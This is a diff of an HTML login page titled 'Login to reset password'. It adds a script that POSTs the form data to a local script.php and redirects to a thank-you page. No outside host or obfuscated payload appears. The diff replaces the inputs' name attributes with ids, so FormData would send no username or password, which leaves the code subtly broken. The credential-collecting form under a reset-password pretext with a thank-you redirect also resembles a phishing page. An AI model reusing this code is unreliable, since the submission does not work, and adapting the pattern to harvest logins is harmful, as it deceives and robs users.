@@ -7,7 +7,7 @@
       background-color: rgb(255, 255, 255);  
     }  
     img {
-        max-width: 40px;
+        max-width: 60px;
     }
     button {   
            background-color: #4CAF50;   
@@ -51,13 +51,44 @@
             <div class="container">  
                 <h1>Login to reset password</h1>
                 <label>Username : </label>   
-                <input type="text" placeholder="Enter Username" name="username" required>  
+                <input type="text" placeholder="Enter Username" id="username" required>  
                 <label>Password : </label>   
-                <input type="password" placeholder="Enter Password" name="password" required>  
+                <input type="password" placeholder="Enter Password" id="password" required>  
                 <button type="submit">Login</button>   
                 <button type="button" class="cancelbtn"> Cancel</button>   
                 Forgot <a href="#"> password? </a>   
             </div>   
-        </form>     
+        </form> 
+        <script>
+            document.addEventListener('DOMContentLoaded', function () {
+                const form = document.getElementById('loginForm');
+            
+                form.addEventListener('submit', function (event) {
+                    event.preventDefault(); // Prevent the default form submission
+            
+                    // Get form data
+                    const formData = new FormData(form);
+            
+                    // Send the data to a server-side script using the Fetch API
+                    fetch('script.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            // If the response is successful, you can redirect the user to a thank you page or show a success message.
+                            // You can handle this based on your requirements.
+                            window.location.href = 'thank_you.html';
+                        } else {
+                            // Handle errors or display an error message to the user.
+                            console.error('Form submission failed.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('An error occurred:', error);
+                    });
+                });
+            });
+            </script>    
     </body>  
 </html>
